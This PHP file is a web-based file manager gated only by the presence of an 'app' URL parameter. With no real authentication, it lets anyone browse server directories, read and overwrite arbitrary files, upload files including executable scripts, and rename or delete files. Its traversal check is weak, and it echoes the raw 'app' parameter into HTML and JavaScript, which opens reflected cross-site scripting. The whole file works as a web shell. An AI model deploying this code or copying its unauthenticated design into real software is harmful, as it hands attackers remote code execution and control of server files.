<?php
if (!isset($_GET['app']) || empty($_GET['app'])) {
    http_response_code(403);
    exit('🛑 Missing "app" parameter.');
}

// Get current directory
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$currentDir = rtrim($currentDir, '/\\');
if (empty($currentDir)) $currentDir = '.';

// Security: prevent directory traversal attacks - but allow legitimate navigation
$currentDir = str_replace(['\\'], '/', $currentDir); // normalize slashes
$currentDir = preg_replace('/\/+/', '/', $currentDir); // remove double slashes
// Only block if trying to go outside current working directory
if (strpos($currentDir, '../') !== false && !realpath($currentDir)) {
    $currentDir = '.';
}

// Handle clear cache request
if (isset($_GET['clear_cache'])) {
    echo "<script>
        document.cookie = 'current_cache=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT';
        alert('Navigation cache cleared!');
        window.location.href = '?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir) . "';
    </script>";
    exit;
}

if (isset($_GET['file']) && !empty($_GET['file'])) {
    $filepath = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['file']);
    if (isset($_POST['edit'])) {
        file_put_contents($filepath, $_POST['content']);
        header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir));
        exit;
    }
    echo "<h2>Editing: " . htmlspecialchars($_GET['file']) . "</h2>";
    echo "<form method='post'><textarea name='content' style='width:100%;height:400px;'>";
    echo htmlspecialchars(file_get_contents($filepath));
    echo "</textarea><br><button type='submit' name='edit'>Save</button></form>";
    exit;
}

// Upload
if (isset($_FILES['upload'])) {
    $uploadPath = $currentDir . DIRECTORY_SEPARATOR . $_FILES['upload']['name'];
    move_uploaded_file($_FILES['upload']['tmp_name'], $uploadPath);
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir));
    exit;
}

// Rename
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $oldPath = $currentDir . DIRECTORY_SEPARATOR . $_GET['rename'];
    $newPath = $currentDir . DIRECTORY_SEPARATOR . $_POST['newname'];
    rename($oldPath, $newPath);
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir));
    exit;
}

// Delete
if (isset($_GET['delete'])) {
    $deletePath = $currentDir . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (is_dir($deletePath)) {
        rmdir($deletePath);
    } else {
        unlink($deletePath);
    }
    header("Location: ?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir));
    exit;
}

echo "<h2>File Manager</h2>";

// Add CSS for better styling
echo "<style>
.nav-buttons {
    margin-bottom: 15px;
}
.back-btn {
    background: linear-gradient(45deg, #007cba, #0099d4);
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-size: 14px;
    font-weight: bold;
    box-shadow: 0 2px 4px rgba(0,0,0,0.2);
    transition: all 0.3s ease;
}
.back-btn:hover {
    background: linear-gradient(45deg, #005a87, #007cba);
    transform: translateY(-1px);
    box-shadow: 0 4px 8px rgba(0,0,0,0.3);
}
.clear-cache-btn {
    background: #dc3545;
    color: white;
    padding: 6px 12px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 12px;
    margin-left: 10px;
}
.clear-cache-btn:hover {
    background: #c82333;
}
.parent-link {
    color: #007cba;
    text-decoration: none;
    margin-left: 10px;
    padding: 8px 12px;
    border: 1px solid #007cba;
    border-radius: 4px;
    display: inline-block;
}
.parent-link:hover {
    background: #007cba;
    color: white;
}
</style>";

// Show current directory and navigation
echo "<p><strong>Current Directory:</strong> " . htmlspecialchars($currentDir) . "</p>";

// Navigation history management with cookies
echo "<script>
function updateNavigationCache(currentPath) {
    // Get existing history from cookie
    let history = [];
    if (document.cookie.indexOf('current_cache=') !== -1) {
        let cookieValue = document.cookie.split('current_cache=')[1];
        if (cookieValue) {
            cookieValue = cookieValue.split(';')[0];
            try {
                history = JSON.parse(decodeURIComponent(cookieValue));
                if (!Array.isArray(history)) history = [];
            } catch(e) {
                history = [];
            }
        }
    }
    
    // Add current path to history if it's not the same as the last one
    if (history.length === 0 || history[history.length - 1] !== currentPath) {
        history.push(currentPath);
        // Keep only last 10 paths to prevent cookie overflow
        if (history.length > 10) {
            history = history.slice(-10);
        }
    }
    
    // Update cookie
    document.cookie = 'current_cache=' + encodeURIComponent(JSON.stringify(history)) + '; path=/; max-age=86400';
}

function goBack() {
    // Get history from cookie
    if (document.cookie.indexOf('current_cache=') !== -1) {
        let cookieValue = document.cookie.split('current_cache=')[1];
        if (cookieValue) {
            cookieValue = cookieValue.split(';')[0];
            try {
                let history = JSON.parse(decodeURIComponent(cookieValue));
                if (Array.isArray(history) && history.length > 1) {
                    // Remove current path and go to previous
                    history.pop();
                    let previousPath = history[history.length - 1];
                    
                    // Update cookie with new history
                    document.cookie = 'current_cache=' + encodeURIComponent(JSON.stringify(history)) + '; path=/; max-age=86400';
                    
                    // Navigate to previous path
                    window.location.href = '?app=" . $_GET['app'] . "&dir=' + encodeURIComponent(previousPath);
                    return;
                }
            } catch(e) {
                console.log('Error parsing navigation history');
            }
        }
    }
    
    // Fallback to parent directory if no history available
    let currentPath = '" . addslashes($currentDir) . "';
    if (currentPath !== '.') {
        let pathParts = currentPath.split('/');
        pathParts.pop();
        let parentDir = pathParts.length === 0 || (pathParts.length === 1 && pathParts[0] === '.') ? '.' : pathParts.join('/');
        window.location.href = '?app=" . $_GET['app'] . "&dir=' + encodeURIComponent(parentDir);
    }
}

function clearNavigationCache() {
    if (confirm('Clear navigation history?')) {
        window.location.href = '?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir) . "&clear_cache=1';
    }
}

// Update navigation cache on page load
updateNavigationCache('" . addslashes($currentDir) . "');
</script>";

// Navigation buttons
echo "<div class='nav-buttons'>";
echo "<button onclick='goBack()' class='back-btn'>🔙 Back</button>";
echo "<button onclick='clearNavigationCache()' class='clear-cache-btn'>�️ Clear Cache</button>";

// Also show traditional parent directory link
if ($currentDir !== '.') {
    $pathParts = explode('/', $currentDir);
    array_pop($pathParts);
    $parentDir = empty($pathParts) || (count($pathParts) == 1 && $pathParts[0] == '.') ? '.' : implode('/', $pathParts);
    
    echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($parentDir) . "' class='parent-link'>📁 Parent Directory</a>";
}
echo "</div>";

echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='upload'>
    <button type='submit'>Upload to Current Directory</button>
</form><hr>";

$files = scandir($currentDir);
echo "<table border='1' cellpadding='5'><tr><th>Type</th><th>Name</th><th>Action</th></tr>";
foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    $fullPath = $currentDir . DIRECTORY_SEPARATOR . $file;
    echo "<tr>";
    
    // Type column
    if (is_dir($fullPath)) {
        echo "<td>📁 DIR</td>";
    } else {
        echo "<td>📄 FILE</td>";
    }
    
    // Name column with navigation for directories
    echo "<td>";
    if (is_dir($fullPath)) {
        $newDir = $currentDir === '.' ? $file : $currentDir . '/' . $file;
        echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($newDir) . "'><strong>$file</strong></a>";
    } else {
        echo $file;
    }
    echo "</td>";
    
    // Action column
    echo "<td>";
    if (is_file($fullPath)) {
        echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir) . "&file=" . urlencode($file) . "'>Edit</a> | ";
    }
    echo "<form style='display:inline' method='post' action='?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir) . "&rename=" . urlencode($file) . "'>
        <input name='newname' value='" . htmlspecialchars($file) . "' size='15'>
        <button type='submit'>Rename</button>
    </form> | ";
    echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($currentDir) . "&delete=" . urlencode($file) . "' onclick='return confirm(\"Delete " . htmlspecialchars($file) . "?\")'>Delete</a>";
    echo "</td></tr>";
}
echo "</table>";
?>
